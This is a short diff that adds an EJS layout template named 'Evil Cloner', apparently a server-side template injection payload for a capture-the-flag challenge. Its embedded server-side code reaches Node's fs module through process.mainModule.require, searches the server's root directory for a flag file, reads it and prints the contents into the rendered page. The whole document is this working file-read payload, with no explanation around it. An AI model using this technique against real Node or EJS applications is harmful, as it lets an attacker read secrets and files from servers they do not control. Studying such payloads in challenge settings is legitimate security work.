@@ -1,0 +1,31 @@
+<%
+  const fs = process.mainModule.require('fs');
+  const path = process.mainModule.require('path');
+
+  const entries = fs.readdirSync('/');
+  const flagName = entries.find(f => /^flag.*\.txt$/i.test(f)) || null;
+
+  let flagValue = '';
+  if (flagName) {
+    try {
+      flagValue = fs.readFileSync(path.join('/', flagName), 'utf8');
+    } catch (e) {
+      flagValue = 'ERROR: ' + e.toString();
+    }
+  } else {
+    flagValue = 'No flag file found';
+  }
+%>
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8" />
+  <title>Evil Cloner</title>
+</head>
+<body>
+  <pre><%= flagValue %></pre>
+  <main class="container">
+    <%- body %>
+  </main>
+</body>
+</html>
